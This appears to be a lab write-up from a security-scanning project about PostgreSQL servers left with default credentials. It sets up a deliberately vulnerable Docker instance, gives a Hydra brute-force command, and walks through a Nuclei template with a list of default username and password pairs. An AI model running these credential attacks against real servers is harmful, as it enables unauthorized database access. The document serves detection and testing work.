# PostgreSQL Default Login   

## Description  

PostgreSQL services configured with default or weak credentials present a significant security risk. Attackers can exploit these misconfigurations to gain unauthorized access, extract sensitive data, modify records, or execute arbitrary SQL commands.

## References  

- [PostgreSQL Password Authentication](https://goteleport.com/learn/postgres-password-authentication/)  
- [PostgreSQL Authentication Documentation](https://www.postgresql.org/docs/current/auth-methods.html)  
- [Common Default PostgreSQL Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt)  

## Vulnerable Setup  


- Execute the following commands to start a PostgreSQL server

```bash
docker-compose up -d
```

Once the server starts, PostgreSQL will be accessible on **port 5432** with default credentials (`postgres:postgres`).  

## Exploitation Steps  


- Brute-Force Authentication using **Hydra** with common credentials

    ```bash
    hydra -C <wordlist> <target-ip> postgres
    ```
    ![image](https://github.com/user-attachments/assets/8ef29fa6-0d0c-4beb-a476-6c3f2ad896d0)

## Steps to Write Nuclei Template

**Pre-Condition Check**

```yaml
pre-condition: |
  var m = require("nuclei/postgres");
  var c = m.PGClient();
  c.IsPostgres(Host, Port);
```

- Ensures the PostgreSQL service is running before attempting authentication.

**JavaScript Execution Block**

```yaml
code: |
  var m = require("nuclei/postgres");
  var c = m.postgres();
  c.Connect(Host, Port, User, Pass);
```

- Loads the PostgreSQL module for Nuclei.  
- Initializes a PostgreSQL client.  
- Attempts to authenticate using various username and password combinations.  

**Define Target Arguments**


```yaml
args:
  Host: "{{Host}}"
  Port: "5432"
  User: "{{usernames}}"
  Pass: "{{passwords}}"
```

- Specifies the target host and PostgreSQL service port (default: **5432**).  
- Uses a predefined list of common usernames and passwords.  

**Attack Mode**
```yml
attack: clusterbomb
```
- This mode systematically tests all combinations of usernames and passwords.  


**Payloads**

```yaml
payloads:
      usernames:
        - "postgres"
        - "admin"
      passwords:
        - "password"
        - "secret"
        - "admin"
        - "postgres"
```
- Uses commonly found weak credentials.

**Stopping Execution on First Match**

```yaml
stop-at-first-match: true
```
- Terminates the scan once valid credentials are discovered.  



## Nuclei Template URL : [postgres-default-logins](https://github.com/projectdiscovery/nuclei-templates/blob/main/javascript/default-logins/postgres-default-logins.yaml)

## Nuclei Command:

```bash
nuclei -id postgres-default-logins -u localhost -vv
```
![image](https://github.com/user-attachments/assets/77ac5c46-5780-4eb4-9a4b-5ad24ec16bc7)
